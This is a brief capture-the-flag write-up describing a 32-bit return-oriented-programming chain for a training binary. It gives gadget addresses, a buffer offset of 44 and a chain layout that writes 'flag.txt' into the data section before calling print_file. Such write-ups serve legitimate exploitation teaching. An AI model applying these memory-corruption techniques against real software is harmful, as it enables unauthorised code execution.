after looking at ghidra and gdb disassembly I found that there was a function named printFile which was printing out the contents of a file given to it.
So we have to give "flag.txt" as an input sosmehow.
for this I used the rop gadget-> 0x080485aa: pop edi; pop ebp; ret;
and the move gadget-> 08048543      MOV        dword ptr [EDI],EBP
both taken from usefulGadgets section
and the data address from the data section and got to know that the offset for this program was 44 usinng gdb.
now I used the following logic:
offset
pop_call
data_addr
"flag"
move_gadget

pop_call
data_addr + 4
".txt"
move_gadget

print_file
return ( 0x0 )
data_addr

this basically eneters the buuffer and then makes a pop call from data and moves flag into the data address and then repeating the same thing we add .txt at after flag (notice the +4) and then we call print_file and the we make a return call from data_addr which reads the flag.txt file.

this was achieved using exploit.py
